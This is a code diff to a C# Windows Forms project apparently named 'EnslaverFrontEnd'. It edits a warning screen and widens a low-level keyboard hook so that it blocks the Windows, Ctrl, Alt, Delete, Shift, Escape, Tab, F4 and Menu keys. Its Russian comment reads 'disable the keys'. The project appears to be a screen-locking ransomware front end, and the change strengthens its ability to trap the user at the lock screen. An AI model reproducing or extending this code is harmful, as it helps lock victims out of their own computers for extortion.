@@ -46,6 +46,7 @@ namespace EnslaverFrontEnd.Views
         /// </summary>
         private void InitializeComponent()
         {
+            BeforeInit();
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(WarningForm));
             this.WarningLabel = new System.Windows.Forms.Label();
             this.axWindowsMediaPlayer1 = new AxWMPLib.AxWindowsMediaPlayer();
@@ -120,28 +121,16 @@ namespace EnslaverFrontEnd.Views
 
         private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
         {
-            Keys PrevKey = Keys.Alt;
             if (nCode >= 0)
             {
                 KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
-
-                if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin) // Выключаем кнопки ВИНДОВС
+                if (objKeyInfo.key == Keys.LWin || objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LControlKey || objKeyInfo.key == Keys.RControlKey
+                    || objKeyInfo.key == Keys.Alt || objKeyInfo.key == Keys.Delete || objKeyInfo.key == Keys.LShiftKey || objKeyInfo.key == Keys.RShiftKey
+                    || objKeyInfo.key == Keys.Escape || objKeyInfo.key == Keys.Tab || objKeyInfo.key == Keys.F4 || objKeyInfo.key == Keys.LMenu
+                    || objKeyInfo.key == Keys.RMenu || objKeyInfo.key == Keys.Menu) // Выключаем кнопки
                 {
                     return (IntPtr)1;
                 }
-
-                if ((PrevKey == Keys.Alt) && (objKeyInfo.key == Keys.Tab))      // 
-                {
-                    return (IntPtr)1;
-                }
-
-                if ((objKeyInfo.key == Keys.LShiftKey) || (objKeyInfo.key == Keys.LControlKey) || (objKeyInfo.key == Keys.Escape))
-                {
-                    return (IntPtr)1;
-                }
-
-
-                PrevKey = objKeyInfo.key;
             }
 
             return CallNextHookEx(ptrHook, nCode, wp, lp);
